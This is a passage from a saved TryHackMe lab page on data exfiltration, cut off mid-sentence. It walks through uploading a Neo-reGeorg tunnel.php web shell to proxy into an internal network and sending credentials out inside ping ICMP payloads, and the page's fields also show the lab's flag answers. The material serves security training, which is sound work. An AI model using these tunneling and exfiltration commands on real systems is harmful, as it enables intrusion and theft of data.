                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '&lt;@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/neoreg

    [+] Mkdir a directory: neoreg_servers
    [+] Create neoreg server files:
       =&gt; neoreg_servers/tunnel.aspx
       =&gt; neoreg_servers/tunnel.ashx
       =&gt; neoreg_servers/tunnel.jsp
       =&gt; neoreg_servers/tunnel_compatibility.jsp
       =&gt; neoreg_servers/tunnel.jspx
       =&gt; neoreg_servers/tunnel_compatibility.jspx
       =&gt; neoreg_servers/tunnel.php</code></pre></div></div><p>The previous command generates encrypted Tunneling clients with&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">thm</span><span style="font-size:1rem">&nbsp;</span>key in the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">neoreg_servers/</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem"><span>directory. Note that there are various extensions available, including <a class="9OdPGnCo glossary-term" onclick="initPopOver(&#39;PHP&#39;, &#39;9OdPGnCo&#39;)">PHP</a>, ASPX, JSP, etc. In our scenario, we will be uploading the&nbsp;</span></span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tunnel.php</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">file via the uploader machine. To access the uploader machine, you can visit</span><span style="font-size:1rem">&nbsp;the following URL:&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">http://MACHINE_IP/uploader</span><span style="font-size:1rem">&nbsp;or&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">https://LAB_WEB_URL.p.thmlabs.com/uploader</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">without the need for a VPN</span><span style="font-size:1rem">.</span></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/2445ab5b8bc971b51f8ebe3ffbd0c07d.png" alt="The Victim&#39;s uploader"></p><p><span>To upload the <a class="WuHccQ1q glossary-term" onclick="initPopOver(&#39;PHP&#39;, &#39;WuHccQ1q&#39;)">PHP</a> file, use&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">admin</span><span style="font-size:1rem">&nbsp;</span>as the key to let you upload any files into the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">uploader.thm.com</span>. Once we have uploaded the file, we can access it on the following URL:&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">http://MACHINE_IP/uploader/files/tunnel.php</span><span style="font-size:1rem">.</span></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top"><span>Creating an <a class="f5DRHn3j glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;f5DRHn3j&#39;)">HTTP</a> Tunnel</span><br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://MACHINE_IP/uploader/files/tunnel.php</code></pre></div></div><p>We need to use the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">neoreg.py</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem"><span>to connect to the client and provide the key to decrypt the tunneling client. We also need to provide a URL to the <a class="tfkGGkBa glossary-term" onclick="initPopOver(&#39;PHP&#39;, &#39;tfkGGkBa&#39;)">PHP</a> file that we uploaded on the uploader machine. </span></span></p><p><span style="font-size:1rem">Once it is connected to the tunneling client, we are ready to use the tunnel connection as a proxy binds on our local machine,&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">127.0.0.1</span><span style="font-size:1rem">,</span><span style="font-size:1rem">&nbsp;on port 1080. </span></p><p><span style="font-size:1rem">For example, if we want to access the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">app.thm.com</span><span style="font-size:1rem">, which has an internal IP address&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">172.20.0.121</span><span style="font-size:1rem">&nbsp;on port 80</span>, we can use the curl command with&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">--socks5</span><span style="font-size:1rem">&nbsp;</span>argument. We can also use other proxy applications, such as ProxyChains, FoxyProxy, etc., to communicate with the internal network.&nbsp;</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top"><span>Access the app.thm.com machine via the <a class="PSz5ghIT glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;PSz5ghIT&#39;)">HTTP</a> Tunneling</span><br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">root@AttackBox:~$ curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
Welcome to APP Server!</code></pre></div></div>
<p>The following diagram shows the traffic flow as it goes through the uploader machine and then communicates with the internal network devices, which in this case, is the App machine. Note that if we check the network traffic from the App machine, we see that the source IP address of incoming traffic comes from the uploader machine.</p>
<p><img src="./TryHackMe _ Data Exfiltration_files/b32d6d9d9c3377acf155044204ec6982.png" alt="HTTP Tunneling diagram" style="width:100%"><br></p><p><span>Now replicate the <a class="mWx7iKyf glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;mWx7iKyf&#39;)">HTTP</a> Tunneling steps to establish tunneling over the HTTP protocol to communicate with&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">flag.thm.com</span><span style="font-size:1rem">&nbsp;with&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">172.20.0.120</span><span style="font-size:1rem">&nbsp;</span><span style="text-align:center;font-size:1rem">as&nbsp;</span><span style="font-size:1rem">an IP address on port&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">80</span><span style="font-size:1rem;text-align:center">. Note that if you access the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">flag.thm.com</span><span style="font-size:1rem">&nbsp;website from other machines within the network, you won't get the flag.</span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details"><span>
                                Check the Apache log file on&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">web.thm.com</span><span style="font-size:1rem">&nbsp;</span>&nbsp;and get the flag!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{*****************}" value="THM{H77P-G37-15-f0un6}" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-dorange faded btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>When you visit the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">http://flag.thm.com/flag</span><span style="font-size:1rem">&nbsp;</span><span>website through the uploader machine via the <a class="jyU8SoEf glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;jyU8SoEf&#39;)">HTTP</a> tunneling technique, what is the flag?</span></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{************************}" value="THM{H77p_7unn3l1n9_l1k3_l337}" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-7">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse7">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 7                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Exfiltration using ICMP
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse7" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p style="text-align:left">
    In this task, we will be showing how to exfiltrate data using the ICMP protocol. ICMP stands for <b>I</b>nternet <b>C</b>ontrol <b>M</b>essage <b>P</b>rotocol, and it is a network layer protocol used to handle error reporting. If you need more information about ICMP and the fundamentals of computer networking, you may visit the following THM room: <a href="https://tryhackme.com/room/whatisnetworking" target="_blank">What is Networking</a>.&nbsp;</p><p style="text-align:left">Network devices such as routers use&nbsp;<span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">ICMP</span>&nbsp;protocol to check network connectivities between devices. Note that the ICMP protocol is not a transport protocol to send data between devices.&nbsp;<span style="font-size:1rem">Let's say that two hosts need to test the connectivity in the network; then, we can use the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">ping</span><span style="font-size:1rem">&nbsp;command to send&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">ICMP</span><span style="font-size:1rem">&nbsp;packets through the network, as shown in the following figure.</span></p>
    <p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/2a65a034de59c6e603a5a5f61fd7d909.png" alt="ICMP Request and Reply"><br></p><p>The&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">HOST1</span><span style="font-size:1rem">&nbsp;sends an ICMP packet with an <b>echo-request</b>&nbsp;packet. Then, if&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">HOST2</span><span style="font-size:1rem">&nbsp;is available, it sends</span><span style="font-size:1rem">&nbsp;an&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">ICMP</span><span style="font-size:1rem">&nbsp;packet back </span><span style="font-size:1rem">with an&nbsp;<b>echo reply </b>message confirming the availability.</span></p><p><span style="font-size:24px">ICMP Data Section</span><br></p><p><span style="font-size:1rem">On a high level, the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">ICMP</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">packet's structure contains a&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Data</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">section that can include strings or copies of other information, such as the IPv4 header, used for error messages. The following diagram shows the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Data</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">section, which is optional to use.</span></p>
    <p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/38e7df5e059ece4c2567bd7f77421b22.png" alt="ICMP Packet Structure"></p>
    <p><span style="font-size:1rem">Note that the Data field is optional and could either be empty or it could contain a random string during the communications.&nbsp;</span><span style="font-size:1rem">As an attacker, we can use the ICMP structure to include our data within the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Data</span><span style="font-size:1rem">&nbsp;section and send it via&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">ICMP</span><span style="font-size:1rem">&nbsp;packet to another machine. The other machine must capture the network traffic with the ICMP packets to receive the data.</span></p><p><span style="font-size:1rem">To perform manual ICMP data exfiltration, we need to discuss&nbsp;</span><span style="font-size:1rem">the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">ping</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">command a</span><span style="font-size:1rem">&nbsp;bit more</span><span style="font-size:1rem">. The&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">ping</span><span style="font-size:1rem">&nbsp;command is a network administrator software available in any operating system. It is used to check the reachability and </span><span style="font-size:1rem">availability </span><span style="font-size:1rem">by sending&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">ICMP</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">packets</span><span style="font-size:1rem">, which can be used as follows:</span></p>
    <p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Sending one ICMP packet using the PING Command<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
                <code class=" language-markup">thm@AttackBox$ ping MACHINE_IP -c 1</code>
            </pre></div></div><p></p>
    <p><span style="font-size:1rem">We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">-c 1</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like.</span><br></p>
    <p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/3e8367a535e3f7f4076986987b9e0dcd.png" alt="Showing the Data Field value in Wireshark"></p>
    
    <p>The Wireshark screenshot shows that the Data section has been selected with random strings. It is important to note that this section could be filled with the data that needs to be transferred to another machine.&nbsp;</p>
    
    <p><span style="font-size:1rem"><span>The ping command in the <a class="vM2m2ssA glossary-term" onclick="initPopOver(&#39;Linux&#39;, &#39;vM2m2ssA&#39;)">Linux</a> OS has an interesting ICMP option. With the&nbsp;</span></span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">-p</span><span style="font-size:1rem">&nbsp;argument, we can specify 16 bytes of data in hex representation to send through the packet.&nbsp;</span><span style="font-size:1rem">Note that the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">-p</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem"><span>option is only available for <a class="wzTPufs9 glossary-term" onclick="initPopOver(&#39;Linux&#39;, &#39;wzTPufs9&#39;)">Linux</a> operating systems.&nbsp;</span></span><span style="font-size:1rem">We can confirm that by checking the ping's help manual page</span><span style="font-size:1rem">.</span></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/61d50ec683ddae6c2f52f532cc02f685.png" style="width:1059px;height:52.0703px" alt="Ping&#39;s -p argument"><br></p><p><span style="font-size:1rem">Let's say that we need to exfiltrate the following credentials&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">thm:tryhackme</span><span style="font-size:1rem">. First, we need to convert it to its Hex representation and then pass it to the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">ping</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">command using&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">-p</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">options as follows,</span></p>
    
    <p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Using the xxd command to convert text to Hex<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
                <code class=" language-markup">root@AttackBox$ echo "thm:tryhackme" | xxd -p 
74686d3a7472796861636b6d650a</code>
            </pre></div></div><p></p>
    <p>We used the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">xxd</span><span style="font-size:1rem">&nbsp;</span>command to convert our string to Hex, and then we can use the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">ping</span><span style="font-size:1rem">&nbsp;</span>command with the Hex value we got from converting the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">thm:tryhackme</span>.</p>
    <p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Send Hex using the ping command.<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
                <code class=" language-markup">root@AttackBox$ ping MACHINE_IP -c 1 -p 74686d3a7472796861636b6d650a</code>
            </pre></div></div><p></p>
    <p>We sent one ICMP packet using the ping command with<span style="font-size:1rem">&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">thm:tryhackme</span><span style="font-size:1rem">&nbsp;Data. Let's look at the Data section for this packet in the Wireshark.</span></p>
    <p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/6a086470f770c67c0a07f9572088e5e1.png" alt="Checking Data Field in Wireshark"><br></p>
    <p>Excellent! We have successfully filled the ICMP's Data section with our data and manually sent it over the network using the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">ping</span><span style="font-size:1rem">&nbsp;</span>command.</p><p></p><p style="box-sizing:border-box;margin-top:0px;margin-bottom:1rem;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-align:left;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial"></p><p></p><p style="box-sizing:border-box;margin-top:0px;margin-bottom:1rem;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-align:left;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial"><span style="box-sizing:border-box;font-size:24px">ICMP Data Exfiltration</span></p><p style="box-sizing:border-box;margin-top:0px;margin-bottom:1rem;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-align:left;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial"><span>Now that we have the basic fundamentals of manually sending data over ICMP packets, let's discuss how to use Metasploit to exfiltrate data. The Metasploit framework uses the same technique explained in the previous section. However, it will capture incoming ICMP packets and wait for a Beginning of File (<a class="0rpNxMMm glossary-term" onclick="initPopOver(&#39;BOF&#39;, &#39;0rpNxMMm&#39;)">BOF</a>) trigger value. Once it is received, it writes to the disk until it gets an End of File (EOF) trigger value. The following diagram shows the required steps for the Metasploit framework. Since we need the Metasploit Framework for this technique, then we need the AttackBox machine to perform this attack successfully.</span></p><p style="text-align:center;box-sizing:border-box;margin-top:0px;margin-bottom:1rem;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial"><img src="./TryHackMe _ Data Exfiltration_files/b45715c44b5998fa9bf6a989b1e0d8d6.png" alt="ICMP Data Exfiltration"><span style="box-sizing:border-box;font-size:24px"><span style="font-size:16px"><br></span></span></p><p style="box-sizing:border-box;margin-top:0px;margin-bottom:1rem;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;letter-spacing:normal;orphans:2;text-align:left;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial"><span style="font-weight:400">Now from the </span><b>AttackBox</b>, let's set up the Metasploit framework by selecting the&nbsp;<span class="notion-enable-hover" 